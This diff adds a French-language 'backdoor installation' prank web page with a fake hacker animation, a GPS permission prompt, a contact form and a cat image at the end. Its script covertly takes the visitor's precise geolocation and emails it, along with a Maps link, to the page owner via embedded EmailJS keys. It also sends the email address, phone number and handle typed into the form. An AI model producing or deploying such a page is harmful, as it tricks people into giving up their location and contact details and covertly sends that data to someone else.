@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW://CORE — BACKDOOR</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+        :root {
+            --green: #00ff9d;
+            --red: #ff0033;
+            --orange: #ff6600;
+            --dark: #0a0a0a;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--dark);
+            color: var(--red);
+            font-family: 'VT323', monospace;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(transparent 0px, transparent 3px, rgba(255,0,51,0.03) 3px, rgba(255,0,51,0.03) 6px);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .header {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 40px;
+            background: rgba(10,0,0,0.98);
+            border-bottom: 1px solid var(--red);
+            display: flex;
+            align-items: center;
+            padding: 0 25px;
+            font-size: 20px;
+            color: var(--red);
+            z-index: 100;
+        }
+
+        /* ── ÉTAPE 1 : FAUSSE BACKDOOR ── */
+        #phase-backdoor {
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .backdoor-box {
+            background: rgba(20, 5, 5, 0.97);
+            border: 2px solid var(--red);
+            padding: 30px;
+            width: 100%;
+            max-width: 660px;
+            box-shadow: 0 0 60px rgba(255,0,51,0.3);
+        }
+
+        .backdoor-title {
+            color: var(--red);
+            font-size: 34px;
+            text-align: center;
+            text-shadow: 0 0 20px var(--red);
+            margin-bottom: 20px;
+            animation: flicker 1.5s infinite;
+        }
+
+        @keyframes flicker {
+            0%,100% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0.3; }
+            94% { opacity: 1; }
+            96% { opacity: 0.5; }
+            97% { opacity: 1; }
+        }
+
+        #backdoor-log {
+            background: #000;
+            border: 1px solid #330000;
+            padding: 15px;
+            min-height: 200px;
+            font-size: 17px;
+            line-height: 1.7;
+            overflow: hidden;
+        }
+
+        .log-line { margin: 0; }
+        .log-line.red    { color: #ff0033; }
+        .log-line.orange { color: #ff6600; }
+        .log-line.green  { color: #00ff9d; }
+        .log-line.white  { color: #cccccc; }
+
+        .progress-wrap { margin-top: 20px; }
+        .progress-label { font-size: 20px; color: var(--orange); margin-bottom: 6px; }
+        .progress-bar {
+            height: 20px;
+            background: #1a0000;
+            border: 2px solid var(--red);
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff0033, #ff6600);
+            transition: width 0.3s linear;
+        }
+        .progress-pct { font-size: 18px; color: var(--red); margin-top: 4px; }
+
+        .cursor { animation: blink 0.8s step-end infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+
+        /* ── OVERLAY GLOBAL ── */
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.97);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 500;
+            font-size: 30px;
+            color: var(--red);
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* ── ÉTAPE 2 : GÉOLOCALISATION ── */
+        #phase-geo {
+            display: none;
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* ── ÉTAPE 3 : FORMULAIRE ── */
+        #phase-form {
+            display: none;
+            position: relative;
+            z-index: 10;
+            height: 100vh;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .terminal-box {
+            background: rgba(15,5,5,0.97);
+            border: 2px solid #330000;
+            padding: 25px;
+            width: 100%;
+            max-width: 620px;
+            box-shadow: 0 0 40px rgba(255,0,51,0.2);
+        }
+
+        h1 { color: var(--red); text-align: center; margin-bottom: 20px; font-size: 30px; text-shadow: 0 0 15px var(--red); }
+
+        .log {
+            min-height: 120px;
+            background: #000;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #330000;
+            font-size: 17px;
+            line-height: 1.5;
+            overflow: hidden;
+        }
+
+        label { display: block; color: #cc3300; margin-bottom: 6px; font-size: 20px; }
+        input {
+            width: 100%;
+            background: #0a0000;
+            border: 2px solid #330000;
+            padding: 11px 15px;
+            color: var(--red);
+            font-family: 'VT323', monospace;
+            font-size: 20px;
+            margin-bottom: 14px;
+        }
+        input:focus { outline: none; border-color: var(--red); box-shadow: 0 0 15px rgba(255,0,51,0.4); }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: transparent;
+            color: var(--red);
+            border: 3px solid var(--red);
+            font-family: 'VT323', monospace;
+            font-size: 26px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+        }
+        button:hover { background: var(--red); color: #000; box-shadow: 0 0 30px var(--red); }
+
+        /* ── ÉTAPE 4 : FIN AVEC CHAT ── */
+        #phase-end {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000;
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        #cat-img {
+            width: 280px;
+            height: 280px;
+            object-fit: cover;
+            border: 4px solid var(--red);
+            border-radius: 10px;
+            box-shadow: 0 0 60px rgba(255,0,51,0.5);
+            animation: cat-pulse 3s ease-in-out infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes cat-pulse {
+            0%,100% { box-shadow: 0 0 60px rgba(255,0,51,0.5); }
+            50%      { box-shadow: 0 0 100px rgba(255,0,51,0.9); }
+        }
+
+        .end-title {
+            font-size: 46px;
+            color: var(--red);
+            text-shadow: 0 0 20px var(--red);
+            animation: flicker 2s infinite;
+            margin-bottom: 15px;
+        }
+
+        .end-subtitle {
+            font-size: 28px;
+            color: var(--green);
+            letter-spacing: 3px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">SHADOW://CORE — INSTALLATION BACKDOOR EN COURS</div>
+    <div class="scanlines"></div>
+
+    <!-- ══════════ PHASE 1 : ANIMATION BACKDOOR ══════════ -->
+    <div id="phase-backdoor">
+        <div class="backdoor-box">
+            <div class="backdoor-title">⚠ INSTALLATION BACKDOOR ⚠</div>
+            <div id="backdoor-log"></div>
+            <div class="progress-wrap">
+                <div class="progress-label" id="prog-label">INJECTION EN COURS...</div>
+                <div class="progress-bar"><div class="progress-fill" id="prog-fill"></div></div>
+                <div class="progress-pct" id="prog-pct">0%</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ══════════ OVERLAY (transitions) ══════════ -->
+    <div class="overlay" id="overlay">
+        <div id="overlay-text"></div>
+        <div style="margin-top:20px; font-size:22px;" id="overlay-sub"></div>
+    </div>
+
+    <!-- ══════════ PHASE 2 : GÉOLOCALISATION ══════════ -->
+    <div id="phase-geo" style="display:none; flex-direction:column; justify-content:center; align-items:center; height:100vh;">
+        <div class="backdoor-box" style="text-align:center;">
+            <div class="backdoor-title">AUTORISATION REQUISE</div>
+            <p style="font-size:22px; color:#cc3300; margin: 20px 0;">
+                La backdoor nécessite un accès :<br>
+                <span style="color:var(--red); font-size:26px;">Coordonnées GPS</span>
+            </p>
+            <button onclick="authorizeGeo()">AUTORISER L'ACCÈS</button>
+        </div>
+    </div>
+
+    <!-- ══════════ PHASE 3 : FORMULAIRE ══════════ -->
+    <div id="phase-form" style="display:none; flex-direction:column; justify-content:center; align-items:center; height:100vh;">
+        <div class="terminal-box">
+            <h1>ENREGISTREMENT DU MODULE</h1>
+            <div class="log" id="form-log"></div>
+            <form id="userForm">
+                <label>EMAIL</label>
+                <input type="email" id="email" required placeholder="user@shadow.net">
+                <label>TÉLÉPHONE</label>
+                <input type="tel" id="phone" required placeholder="+223 XX XX XX XX">
+                <label>PSEUDO / HANDLE</label>
+                <input type="text" id="pseudo" required placeholder="ghost_404">
+                <button type="submit">VALIDER →</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- ══════════ PHASE 4 : FIN + CHAT ══════════ -->
+    <div id="phase-end" style="display:none;">
+        <img id="cat-img" src="https://cataas.com/cat" alt="Chat" onerror="this.src='https://placekitten.com/280/280'">
+        <div class="end-title">BACKDOOR INSTALLÉE.</div>
+        <div class="end-subtitle">À bientôt pour la partie 2... 😸</div>
+    </div>
+
+    <script>
+        // ── EmailJS (même config que bouton1.html) ──
+        emailjs.init({ publicKey: "2Hj109Gp2ovu7gOoA" });
+        const SERVICE_ID  = "service_fw6no9n";
+        const TEMPLATE_ID = "template_rj9r8fq";
+
+        // ── PHASE 1 : Fausse animation backdoor ──
+        const backdoorLogs = [
+            { text: "Initialisation du vecteur d'attaque...", cls: "red",    delay: 300  },
+            { text: "Bypass firewall... [SUCCESS]",           cls: "orange", delay: 1100 },
+            { text: "Injection kernel_module_7x...",          cls: "white",  delay: 1900 },
+            { text: "Escalade de privilèges: ROOT obtenu",   cls: "red",    delay: 2800 },
+            { text: "Chiffrement du canal C2...",             cls: "orange", delay: 3600 },
+            { text: "Ouverture du port 31337...",             cls: "white",  delay: 4400 },
+            { text: "Installation persistante...",            cls: "red",    delay: 5200 },
+            { text: "Clé backdoor générée: 7F-4A-XX-OMEGA",  cls: "green",  delay: 6000 },
+        ];
+
+        const logContainer = document.getElementById('backdoor-log');
+
+        function addBackdoorLog(text, cls) {
+            const line = document.createElement('div');
+            line.className = `log-line ${cls}`;
+            line.textContent = `> ${text}`;
+            logContainer.appendChild(line);
+        }
+
+        // Barre de progression animée
+        let pct = 0;
+        const progFill  = document.getElementById('prog-fill');
+        const progPct   = document.getElementById('prog-pct');
+        const progLabel = document.getElementById('prog-label');
+
+        const progInterval = setInterval(() => {
+            if (pct < 100) {
+                pct += Math.random() * 3;
+                if (pct > 100) pct = 100;
+                progFill.style.width = pct + '%';
+                progPct.textContent  = Math.floor(pct) + '%';
+            } else {
+                clearInterval(progInterval);
+                progLabel.textContent = "INSTALLATION COMPLÈTE ✓";
+            }
+        }, 180);
+
+        // Affichage des logs
+        backdoorLogs.forEach(({ text, cls, delay }) => {
+            setTimeout(() => addBackdoorLog(text, cls), delay);
+        });
+
+        // Après l'animation → phase géolocalisation
+        setTimeout(() => {
+            document.getElementById('phase-backdoor').style.display = 'none';
+            document.getElementById('phase-geo').style.display = 'flex';
+        }, 7500);
+
+        // ── PHASE 2 : Géolocalisation ──
+        function authorizeGeo() {
+            const overlay    = document.getElementById('overlay');
+            const overlayTxt = document.getElementById('overlay-text');
+            const overlaySub = document.getElementById('overlay-sub');
+
+            overlay.style.display = 'flex';
+            overlayTxt.textContent = "RÉCUPÉRATION DES COORDONNÉES...";
+
+            setTimeout(() => { overlaySub.textContent = "Synchronisation GPS..."; }, 900);
+            setTimeout(() => { overlaySub.textContent = "Coordonnées verrouillées ✓"; }, 2200);
+
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                document.getElementById('phase-geo').style.display = 'none';
+                document.getElementById('phase-form').style.display = 'flex';
+                // Logs formulaire
+                setTimeout(() => addFormLog("Connexion au serveur C2...", "#ff6600"), 500);
+                setTimeout(() => addFormLog("Chiffrement end-to-end activé...", "#ff0033"), 1300);
+                setTimeout(() => addFormLog("En attente d'identification...", "#cccccc"), 2100);
+            }, 3500);
+
+            // Géolocalisation + envoi via EmailJS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude.toFixed(6);
+                        const lon = position.coords.longitude.toFixed(6);
+                        const acc = Math.round(position.coords.accuracy);
+                        emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                            email: "GPS",
+                            phone: "---",
+                            pseudo: "---",
+                            message: `[GPS - BACKDOOR]\nLatitude : ${lat}\nLongitude : ${lon}\nPrécision : ${acc}m\nDate : ${new Date().toLocaleString()}\nLien Maps : https://maps.google.com/?q=${lat},${lon}`
+                        }).catch(() => {});
+                    },
+                    function() {}
+                );
+            }
+        }
+
+        // ── PHASE 3 : Formulaire ──
+        function addFormLog(text, color = "#ff0033") {
+            const logDiv = document.getElementById('form-log');
+            const line   = document.createElement('div');
+            line.style.color    = color;
+            line.innerHTML = `> ${text}<span class="cursor">_</span>`;
+            logDiv.appendChild(line);
+        }
+
+        document.getElementById('userForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email  = document.getElementById('email').value;
+            const phone  = document.getElementById('phone').value;
+            const pseudo = document.getElementById('pseudo').value;
+
+            const overlay    = document.getElementById('overlay');
+            const overlayTxt = document.getElementById('overlay-text');
+            overlay.style.display = 'flex';
+            overlayTxt.textContent = "VALIDATION DES DONNÉES...";
+
+            emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+                email, phone, pseudo,
+                message: `[BACKDOOR] Inscription — ${new Date().toLocaleString()}`
+            }).then(() => {
+                addFormLog("Identité enregistrée dans le système", "#00ff9d");
+                setTimeout(() => {
+                    overlayTxt.textContent = "MODULE ACTIVÉ...";
+                    document.body.style.transition = "opacity 1.5s";
+                    document.body.style.opacity = "0";
+                    setTimeout(() => {
+                        document.body.style.opacity = "1";
+                        document.getElementById('phase-form').style.display  = 'none';
+                        document.getElementById('phase-end').style.display   = 'flex';
+                        overlay.style.display = 'none';
+                    }, 1600);
+                }, 1200);
+            }).catch(() => {
+                overlayTxt.textContent = "ERREUR DE CONNEXION";
+            });
+        });
+    </script>
+</body>
+</html>
